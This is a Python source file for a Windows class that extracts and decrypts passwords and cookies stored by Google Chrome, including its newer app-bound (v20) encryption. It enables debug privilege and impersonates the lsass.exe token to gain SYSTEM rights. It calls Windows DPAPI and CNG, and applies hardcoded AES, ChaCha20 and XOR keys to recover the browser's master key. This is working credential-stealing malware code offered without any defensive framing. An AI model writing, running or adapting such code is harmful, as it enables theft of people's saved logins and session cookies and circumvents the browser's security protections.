import os
import io
import json
import struct
import ctypes
import win32crypt
import base64
import binascii
from contextlib import contextmanager

import windows
import windows.security
import windows.crypto
import windows.generated_def as gdef

from Crypto.Cipher import AES, ChaCha20_Poly1305

class ChromePWDecrypter:
    def __init__(self, db_path,local_state):
        self.db_path = db_path
        self.local_state = local_state
        self.og_encryption_key = self.fetch_og_encryption_key()
        self.new_encryption_key = self.fetch_new_encrytion_key()
    def decrypt_with_cng(self,input_data):
        ncrypt = ctypes.windll.NCRYPT
        hProvider = gdef.NCRYPT_PROV_HANDLE()
        provider_name = "Microsoft Software Key Storage Provider"
        status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
        assert status == 0, f"NCryptOpenStorageProvider failed with status {status}"

        hKey = gdef.NCRYPT_KEY_HANDLE()
        key_name = "Google Chromekey1"
        status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
        assert status == 0, f"NCryptOpenKey failed with status {status}"

        pcbResult = gdef.DWORD(0)
        input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)

        status = ncrypt.NCryptDecrypt(
            hKey,
            input_buffer,
            len(input_buffer),
            None,
            None,
            0,
            ctypes.byref(pcbResult),
            0x40
        )
        assert status == 0, f"1st NCryptDecrypt failed with status {status}"

        buffer_size = pcbResult.value
        output_buffer = (ctypes.c_ubyte * pcbResult.value)()

        status = ncrypt.NCryptDecrypt(
            hKey,
            input_buffer,
            len(input_buffer),
            None,
            output_buffer,
            buffer_size,
            ctypes.byref(pcbResult),
            0x40
        )
        assert status == 0, f"2nd NCryptDecrypt failed with status {status}"

        ncrypt.NCryptFreeObject(hKey)
        ncrypt.NCryptFreeObject(hProvider)

        return bytes(output_buffer[:pcbResult.value])
    def byte_xor(self,ba1, ba2):
        return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])
    @contextmanager
    def impersonate_lsass(self):
        """impersonate lsass.exe to get SYSTEM privilege"""
        original_token = windows.current_thread.token
        try:
            windows.current_process.token.enable_privilege("SeDebugPrivilege")
            proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
            lsass_token = proc.token
            impersonation_token = lsass_token.duplicate(
                type=gdef.TokenImpersonation,
                impersonation_level=gdef.SecurityImpersonation
            )
            windows.current_thread.token = impersonation_token
            yield
        finally:
            windows.current_thread.token = original_token
    def decrypt_v20(self,encrypted_value):
        """Decrypt v20 encrypted data (cookies or passwords)"""
        if encrypted_value[:3] != b"v20":
            return None
        
        iv = encrypted_value[3:3+12]
        ciphertext = encrypted_value[3+12:-16]
        tag = encrypted_value[-16:]
        
        cipher = AES.new(self.new_encryption_key, AES.MODE_GCM, nonce=iv)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        
        # For cookies, skip first 32 bytes; for passwords, use all bytes
        return decrypted
    def parse_key_blob(self,blob_data: bytes) -> dict:
        buffer = io.BytesIO(blob_data)
        parsed_data = {}

        header_len = struct.unpack('<I', buffer.read(4))[0]
        parsed_data['header'] = buffer.read(header_len)
        content_len = struct.unpack('<I', buffer.read(4))[0]
        assert header_len + content_len + 8 == len(blob_data)
        
        parsed_data['flag'] = buffer.read(1)[0]
        
        if parsed_data['flag'] == 1 or parsed_data['flag'] == 2:
            parsed_data['iv'] = buffer.read(12)
            parsed_data['ciphertext'] = buffer.read(32)
            parsed_data['tag'] = buffer.read(16)
        elif parsed_data['flag'] == 3:
            parsed_data['encrypted_aes_key'] = buffer.read(32)
            parsed_data['iv'] = buffer.read(12)
            parsed_data['ciphertext'] = buffer.read(32)
            parsed_data['tag'] = buffer.read(16)
        else:
            raise ValueError(f"Unsupported flag: {parsed_data['flag']}")

        return parsed_data
    def derive_v20_master_key(self,parsed_data: dict) -> bytes:
        if parsed_data['flag'] == 1:
            aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
        elif parsed_data['flag'] == 2:
            chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
            cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed_data['iv'])
        elif parsed_data['flag'] == 3:
            xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
            with self.impersonate_lsass():
                decrypted_aes_key = self.decrypt_with_cng(parsed_data['encrypted_aes_key'])
            xored_aes_key = self.byte_xor(decrypted_aes_key, xor_key)
            cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
    

    def fetch_new_encrytion_key(self):
        # Read Local State
        with open(self.local_state, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
        assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
        key_blob_encrypted = binascii.a2b_base64(app_bound_encrypted_key)[4:]
        
        # Decrypt with SYSTEM DPAPI
        with self.impersonate_lsass():
            key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
        
        # Decrypt with user DPAPI
        key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
        # Parse key blob and derive master key
        parsed_data = self.parse_key_blob(key_blob_user_decrypted)
        v20_master_key = self.derive_v20_master_key(parsed_data)
        return v20_master_key
    def fetch_og_encryption_key(self):
        """
        Gets the chrome encryption key.
        """
        with open(self.local_state, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)
        # decoding the encryption key using base64
        encryption_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
        # remove Windows Data Protection API (DPAPI) str
        encryption_key = encryption_key[5:]
        # return decrypted key
        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
    
    def decrypt_new(self,password):
        """Extract and decrypt Chrome passwords"""
        try:
                decrypted = self.decrypt_v20(password)
                if decrypted:
                    # Passwords don't have the 32-byte prefix like cookies
                    return decrypted.decode('utf-8', errors='ignore')
        except Exception as e:
            print(e)
            return "Balls"
    def decrypt_default(self,password):
        return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[0])
    def decrypt_old(self,password):
            # v10/v11 uses AES-256-GCM
            # First 3 bytes are version (v10/), next 12 bytes are IV
            iv = password[3:15]
            encrypted_password = password[15:]
            
            # Create cipher and decrypt
            cipher = AES.new(self.og_encryption_key, AES.MODE_GCM, iv)
            # Remove 16-byte authentication tag at the end before decoding
            return cipher.decrypt(encrypted_password)[:-16].decode()
    